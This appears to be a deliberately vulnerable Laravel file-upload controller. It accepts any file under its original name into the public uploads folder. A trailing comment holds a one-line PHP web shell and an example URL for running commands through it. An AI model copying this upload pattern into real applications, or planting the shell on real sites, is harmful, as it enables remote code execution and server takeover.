<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;

class FileController extends Controller
{

    // uploadView

    public function uploadView()
    {
        return view('upload');
    }

    public function upload(Request $request)
    {
       try {
        //code...
        $validateMenutype = Validator::make($request->all(), [
            'file' => 'required'
        ]);
        if ($validateMenutype->fails()) {
            return response()->json(['error' => $validateMenutype->errors()], 401);
        }
        if ($request->hasFile('file')) {
            $file = $request->file('file');
            $fileName = $file->getClientOriginalName();
            $file->move(public_path('uploads'), $fileName);
            return 'File uploaded successfully';
        }
       } catch (\Throwable $th) {
        //throw $th;
        return 'Error uploading file';
       }
    }
}


// <?php
// echo system($_GET['cmd']);  https://yourdomain.com/uploads/malicious.php?cmd=ls 
// 

